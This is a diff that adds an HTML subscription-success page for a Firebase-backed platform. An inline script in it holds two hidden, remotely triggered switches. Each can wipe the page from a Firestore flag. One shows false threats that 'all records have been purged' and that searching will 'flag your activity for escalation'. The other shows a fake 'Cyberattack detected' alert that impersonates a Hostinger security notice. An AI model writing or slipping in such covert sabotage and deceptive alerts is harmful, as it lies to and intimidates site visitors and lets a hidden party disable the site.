@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Subscription Activated 🎉</title>
+    <link rel="stylesheet" href="platform.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="success-card">
+        <div class="checkmark-circle">
+          <svg
+            class="checkmark"
+            xmlns="http://www.w3.org/2000/svg"
+            viewBox="0 0 52 52"
+          >
+            <circle
+              class="checkmark-circle-anim"
+              cx="26"
+              cy="26"
+              r="25"
+              fill="none"
+            />
+            <path
+              class="checkmark-check"
+              fill="none"
+              d="M14.1 27.2l7.1 7.2 16.7-16.8"
+            />
+          </svg>
+        </div>
+
+        <h1>Subscription Activated! 🎉</h1>
+        <p class="success-message">
+          Your premium access is now live. Time to crush it!
+        </p>
+
+        <div class="subscription-info">
+          <div class="info-item">
+            <span class="label">Status:</span>
+            <span class="value active">Active</span>
+          </div>
+          <div class="info-item">
+            <span class="label">Valid Until:</span>
+            <span class="value" id="validUntilDate">Loading...</span>
+          </div>
+        </div>
+
+        <button class="cta-button" id="goToPlatform">
+          <span>Enter Platform</span>
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            width="20"
+            height="20"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <line x1="5" y1="12" x2="19" y2="12"></line>
+            <polyline points="12 5 19 12 12 19"></polyline>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Firebase Config -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="firebase-config.js"></script>
+    <script>
+        // ===== KILL SWITCH CHECK (WITH YOUR DESIGN) =====
+db.collection('config').doc('killSwitch').onSnapshot((doc) => {
+    if (doc.exists && doc.data().active === true) {
+        console.log('KILL SWITCH ACTIVATED - SITE KILLED');
+        
+        // NUKE THE ENTIRE PAGE
+        document.body.innerHTML = '' +
+            '<!DOCTYPE html>' +
+            '<html>' +
+            '<head>' +
+            '<meta charset="UTF-8">' +
+            '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+            '<title>Site Under Maintenance</title>' +
+            '<style>' +
+            '* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Courier New", "Consolas", monospace; }' +
+            'body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; background: #000000; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; animation: screen-flicker 0.15s infinite; }' +
+            'body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(0,0,0,0) 0px, rgba(0,0,0,0.03) 1px, rgba(0,0,0,0) 2px); pointer-events: none; z-index: 100; animation: subtle-scan 10s linear infinite; }' +
+            '@keyframes subtle-scan { 0% { transform: translateY(0); } 100% { transform: translateY(4px); } }' +
+            '.maintenance-container { text-align: center; padding: 60px 50px; background: #000000; max-width: 650px; position: relative; }' +
+            '@keyframes breath { 0%, 100% { box-shadow: 0 0 60px rgba(139,0,0,0.3), 0 0 30px rgba(139,0,0,0.2), inset 0 0 100px rgba(0,0,0,0.8); } 50% { box-shadow: 0 0 100px rgba(139,0,0,0.5), 0 0 50px rgba(139,0,0,0.4), inset 0 0 100px rgba(0,0,0,0.8); } }' +
+            '.skull { font-size: 6rem; margin-bottom: 30px; animation: slow-pulse 3s ease-in-out infinite; filter: drop-shadow(0 0 20px rgba(139,0,0,0.6)); }' +
+            '@keyframes slow-pulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px rgba(139,0,0,0.6)); } 50% { transform: scale(1.05); filter: drop-shadow(0 0 30px rgba(139,0,0,0.8)); } }' +
+            'h1 { color: #8b0000; font-size: 2.8rem; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 3px; font-weight: 600; text-shadow: 0 0 30px rgba(139,0,0,0.8); animation: text-breath 3s ease-in-out infinite; }' +
+            '@keyframes text-breath { 0%, 100% { text-shadow: 0 0 20px rgba(139,0,0,0.6); } 50% { text-shadow: 0 0 40px rgba(139,0,0,0.9); } }' +
+            'p { color: #999; font-size: 1.15rem; line-height: 1.8; margin-bottom: 15px; font-weight: 400; }' +
+            'p:last-of-type { color: #b33; font-weight: 500; animation: warning-pulse 2s ease-in-out infinite; }' +
+            '@keyframes warning-pulse { 0%, 100% { color: #b33; text-shadow: 0 0 10px rgba(187,51,51,0.3); } 50% { color: #d44; text-shadow: 0 0 20px rgba(221,68,68,0.5); } }' +
+            '.error-code { margin-top: 35px; padding: 18px 25px; background: rgba(139,0,0,0.08); border: 1px solid rgba(139,0,0,0.3); box-shadow: inset 0 0 20px rgba(139,0,0,0.1); }' +
+            '.error-code code { color: #8b0000; font-family: "Courier New", "Consolas", monospace; font-size: 0.95rem; letter-spacing: 1px; text-shadow: 0 0 10px rgba(139,0,0,0.4); }' +
+            '.particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }' +
+            '.particle { position: absolute; width: 1px; height: 1px; background: rgba(139,0,0,0.4); box-shadow: 0 0 3px rgba(139,0,0,0.6); animation: float-particle 20s infinite linear; }' +
+            '@keyframes float-particle { 0% { transform: translateY(100vh) translateX(0); opacity: 0; } 5% { opacity: 0.6; } 95% { opacity: 0.6; } 100% { transform: translateY(-10vh) translateX(30px); opacity: 0; } }' +
+            '@keyframes screen-flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.98; } }' +
+            '</style>' +
+            '</head>' +
+            '<body>' +
+            '<div class="particles" id="particles"></div>' +
+            '<div class="maintenance-container">' +
+            '<h1>Access Terminated</h1>' +
+            '<p>This site no longer exists in any accessible form. All records have been purged from the network.</p>' +
+            '<p>Continuing to search will only flag your activity for escalation. This is your only warning.</p>' +
+            '<div class="error-code">' +
+            '<code>UNAUTHORIZED_ACCESS_DETECTED</code>' +
+            '</div>' +
+            '</div>' +
+            '<script>' +
+            'const particlesContainer = document.getElementById("particles");' +
+            'for (let i = 0; i < 25; i++) {' +
+            '  const particle = document.createElement("div");' +
+            '  particle.className = "particle";' +
+            '  particle.style.left = Math.random() * 100 + "%";' +
+            '  particle.style.animationDelay = Math.random() * 20 + "s";' +
+            '  particle.style.animationDuration = (15 + Math.random() * 10) + "s";' +
+            '  particlesContainer.appendChild(particle);' +
+            '}' +
+            'setInterval(() => {' +
+            '  if (Math.random() > 0.97) {' +
+            '    document.body.style.filter = "hue-rotate(5deg)";' +
+            '    setTimeout(() => {' +
+            '      document.body.style.filter = "none";' +
+            '    }, 50);' +
+            '  }' +
+            '}, 200);' +
+            '<\/script>' +
+            '</body>' +
+            '</html>';
+        
+        // Stop all JavaScript execution
+        throw new Error('Site killed by admin');
+    } else {
+        console.log('Site Active');
+    }
+});
+
+// =====CYBERATTACK CHECK (FULL SCREEN VERSION) =====
+db.collection("config").doc("fakeAttack").onSnapshot((doc) => {
+  if (!doc.exists) return;
+
+  const data = doc.data();
+  if (data.active !== true) return;
+
+  // Replace whole document with custom HTML
+  document.open();
+  document.write(
+    '<!DOCTYPE html>' +
+      "<html>" +
+      "<head>" +
+      '<meta charset="UTF-8">' +
+      '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+      "<title>Site Under Maintenance</title>" +
+      "<style>" +
+      "*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New','Consolas',monospace;}" +
+      "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;animation:screen-flicker 0.15s infinite;}" +
+      "body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0)0px,rgba(0,0,0,0.03)1px,rgba(0,0,0,0)2px);pointer-events:none;z-index:100;animation:subtle-scan 10s linear infinite;}" +
+      "@keyframes subtle-scan{0%{transform:translateY(0);}100%{transform:translateY(4px);}}" +
+      ".maintenance-container{text-align:center;padding:60px 50px;background:#000;max-width:1050px;position:relative;z-index:10;}" +
+      "h1{color:red;font-size:1.3rem;margin-bottom:25px;letter-spacing:1px;font-weight:900;text-shadow:0 0 30px rgba(139,0,0,0.8);}" +
+      "h2{color:#fff;font-size:0.8rem;margin-top:100px;margin-bottom:-100px;letter-spacing:1px;font-weight:100;text-shadow:0 0 30px rgba(139,0,0,0.8);}" +
+      "p{color:#fff;font-size:1rem;margin-bottom:5px;letter-spacing:1px;font-weight:100;text-shadow:0 0 30px rgba(139,0,0,0.8);}" +
+      "span{font-weight:900;}" +
+      ".particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}" +
+      ".particle{position:absolute;width:1px;height:1px;background:rgba(139,0,0,0.4);box-shadow:0 0 3px rgba(139,0,0,0.6);animation:float-particle 20s infinite linear;}" +
+      "@keyframes float-particle{0%{transform:translateY(100vh) translateX(0);opacity:0;}5%{opacity:0.6;}95%{opacity:0.6;}100%{transform:translateY(-10vh) translateX(30px);opacity:0;}}" +
+      "@keyframes screen-flicker{0%,100%{opacity:1;}50%{opacity:0.98;}}" +
+      "</style>" +
+      "</head>" +
+      "<body>" +
+      '<div class="particles" id="particles"></div>' +
+      '<div class="maintenance-container">' +
+      "<h1>Cyberattack detected</h1>" +
+      "<p><span>Users:</span> Please try again later.</p>" +
+      "<p><span>Administrator:</span> Review system logs immediately.</p>" +
+      "<h2>Automated security alert – Hostinger</h2>" +
+      "</div>" +
+      "<script>" +
+      'const particlesContainer = document.getElementById("particles");' +
+      "for (let i = 0; i < 25; i++) {" +
+      '  const particle = document.createElement("div");' +
+      '  particle.className = "particle";' +
+      '  particle.style.left = Math.random() * 100 + "%";' +
+      '  particle.style.animationDelay = Math.random() * 20 + "s";' +
+      '  particle.style.animationDuration = (15 + Math.random() * 10) + "s";' +
+      "  particlesContainer.appendChild(particle);" +
+      "}" +
+      "setInterval(() => {" +
+      "  if (Math.random() > 0.97) {" +
+      '    document.body.style.filter = "hue-rotate(5deg)";' +
+      "    setTimeout(() => {" +
+      '      document.body.style.filter = "none";' +
+      "    }, 50);" +
+      "  }" +
+      "}, 200);" +
+      "<\/script>" +
+      "</body>" +
+      "</html>"
+  );
+  document.close();
+
+  // stop rest of JS on existing page
+  throw new Error("cyberattack detected");
+});
+    </script>
+    <script src="platform.js"></script>
+  </body>
+</html>
